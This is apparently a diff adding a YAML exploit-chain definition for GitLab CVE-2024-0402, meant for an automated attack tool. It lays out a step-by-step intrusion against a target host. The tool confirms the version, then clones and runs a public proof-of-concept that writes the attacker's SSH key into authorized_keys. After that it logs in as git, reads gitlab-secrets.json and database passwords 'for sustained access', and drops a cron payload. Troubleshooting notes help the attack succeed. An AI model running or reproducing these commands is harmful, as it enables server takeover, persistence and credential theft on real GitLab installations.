@@ -1,0 +1,72 @@
+chain_id: gitlab_cve_2024_0402
+title: "GitLab — CVE-2024-0402 workspace path traversal → arbitrary file write → RCE"
+severity: HIGH
+tags: [gitlab, cve-2024-0402, path-traversal, file-write, rce, authenticated]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2024-0402" }
+    - { product_pattern: "(?i)gitlab" }
+    - { banner_pattern: "(?i)gitlab" }
+    - { path_pattern: "(?i)/(api/v4/projects|-/workspaces)" }
+
+description: |
+  GitLab CE/EE 16.0 → 16.5.8 / 16.6 → 16.6.6 / 16.7 → 16.7.4 /
+  16.8.0 → 16.8.1. Workspace creation lets an authenticated user
+  write files anywhere on the GitLab server filesystem via a
+  crafted symlink in the workspace project. From there, RCE is a
+  matter of overwriting `~git/.ssh/authorized_keys`,
+  `/etc/cron.d/*`, or a Rails initializer the unicorn worker
+  re-reads. Authentication is required but any account works,
+  including self-registration if it is open.
+
+steps:
+  - id: 1
+    title: "Confirm version"
+    command: |
+      curl -sk "https://$VICTIMA/api/v4/version" -H "PRIVATE-TOKEN: $TOKEN"
+      curl -sk "https://$VICTIMA/help" | grep -Eo 'GitLab Enterprise Edition [0-9.]+' | head -1
+
+  - id: 2
+    title: "Public PoC — write authorized_keys via the workspace traversal"
+    command: |
+      git clone https://github.com/Occamsec/CVE-2024-0402 /tmp/gl0402
+      python3 /tmp/gl0402/exploit.py -u https://$VICTIMA -t $TOKEN \
+        -p ~/.ssh/id_rsa.pub \
+        -d /var/opt/gitlab/.ssh/authorized_keys
+
+  - id: 3
+    title: "SSH in as `git`"
+    command: |
+      ssh -i ~/.ssh/id_rsa git@$VICTIMA -p 22
+      # GitLab Omnibus runs the rails app as `git`; you now have
+      # access to the secrets/, config/, and runtime db credentials.
+
+  - id: 4
+    title: "Read the GitLab secrets and DB password for sustained access"
+    command: |
+      cat /etc/gitlab/gitlab-secrets.json | jq '.gitlab_rails | keys'
+      grep -E '^postgres' /etc/gitlab/gitlab.rb /var/opt/gitlab/gitlab-rails/etc/database.yml
+
+  - id: 5
+    title: "RCE alternative — drop a cron entry"
+    command: |
+      python3 /tmp/gl0402/exploit.py -u https://$VICTIMA -t $TOKEN \
+        -p ./payload.cron \
+        -d /etc/cron.d/gitlab_runner_pwn
+
+common_errors:
+  - error: "workspace creation returns 404"
+    solution: |
+      `remote_development` feature flag is off (default in 16.0).
+      Enable on the foothold project via the API: `PUT
+      /projects/:id/features` with `remote_development=true` —
+      requires Maintainer.
+  - error: "PoC writes the file but unicorn does not see it"
+    solution: |
+      Rails initializers are only re-read on worker restart. Use
+      the cron path or authorized_keys for an immediate effect.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2024-0402
+  - https://about.gitlab.com/releases/2024/01/25/critical-security-release-gitlab-16-8-1-released/
